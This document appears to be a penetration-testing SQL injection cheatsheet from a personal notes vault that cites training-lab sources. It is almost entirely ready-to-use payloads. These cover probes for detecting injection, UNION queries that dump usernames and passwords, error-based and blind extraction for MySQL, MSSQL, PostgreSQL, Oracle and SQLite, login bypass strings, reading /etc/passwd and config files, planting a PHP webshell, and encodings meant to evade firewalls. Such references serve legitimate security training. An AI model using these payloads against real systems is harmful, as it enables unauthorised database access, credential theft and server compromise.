---
title: "SQL Injection Cheatsheet"
type: cheatsheet
tags: [cheatsheet, exploitation, injection, sqli, waf-bypass, web]
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [cpts-sqli-fundamentals, ps-labs-sqli, thm-adv-sqli-advanced, thm-linux-sql, thm-web-sql-fundamentals, h1-scraped-sqli]
---

## Detection Probes

```sql
'                -- break syntax
''               -- escaped quote — no error confirms string context
'-- -            -- comment out rest (MySQL/MSSQL)
' OR '1'='1      -- always-true
' AND '1'='2     -- always-false (check for response diff)
```

## UNION Attack — Setup

```sql
-- Step 1: column count via ORDER BY (increment until error)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- Step 1 alt: NULL expansion
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -

-- Step 2: find string column (replace NULLs one at a time)
' UNION SELECT 'a',NULL,NULL-- -

-- Step 3: extract data
' UNION SELECT database(),user(),version()-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password,NULL FROM users-- -
' UNION SELECT CONCAT(username,0x3a,password),NULL,NULL FROM users-- -
```

## Error-Based (MySQL)

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
```

## Boolean Blind Template

```sql
' AND 1=1-- -                               -- true (baseline)
' AND 1=2-- -                               -- false (spot the diff)
' AND SUBSTRING(database(),1,1)='a'-- -     -- char-by-char
' AND ASCII(SUBSTRING(database(),1,1))=109-- -
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1-- -
```

## Time-Based Blind by DBMS

```sql
-- MySQL
' AND SLEEP(5)-- -
' AND IF(SUBSTRING(database(),1,1)='m',SLEEP(5),0)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL
'; SELECT pg_sleep(5)-- -

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -

-- SQLite
' AND randomblob(500000000/1)-- -
```

## Authentication Bypass

```sql
admin'-- -
admin'#
' OR '1'='1
' OR 1=1-- -
') OR ('1'='1
' OR 1=1 LIMIT 1-- -
```

## File Operations (MySQL)

```sql
-- Read
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL-- -

-- Write webshell (FILE priv + writable path required)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```

## WAF Bypass Quick-Ref

```sql
-- Comments
UN/**/ION SEL/**/ECT
/*!UNION*/ /*!SELECT*/

-- Case
uNiOn SeLeCt

-- URL encode
%27 OR %271%27%3D%271
%55NION %53ELECT

-- Whitespace substitution
UNION%09SELECT
UNION%0ASELECT
UNION(SELECT

-- Double URL encode
%2527  →  %27  →  '
```

## DBMS Quick Reference

| DBMS | Version | Current DB | Current User | Tables |
|------|---------|-----------|--------------|--------|
| MySQL | `@@version` | `database()` | `user()` | `information_schema.tables` |
| MSSQL | `@@version` | `db_name()` | `system_user` | `information_schema.tables` |
| PostgreSQL | `version()` | `current_database()` | `current_user` | `information_schema.tables` |
| Oracle | `v$version` | `SELECT ora_database_name FROM dual` | `SELECT user FROM dual` | `all_tables` |
| SQLite | `sqlite_version()` | n/a | n/a | `sqlite_master` |

## Comments by DBMS

| DBMS | Line comment | Block comment |
|------|-------------|---------------|
| MySQL | `-- -` or `#` | `/* */` |
| MSSQL | `--` | `/* */` |
| PostgreSQL | `--` | `/* */` |
| Oracle | `--` | `/* */` |
| SQLite | `--` | `/* */` |

→ See [[sqlmap]] for automated exploitation
→ See [[sql-injection]] for full technique detail
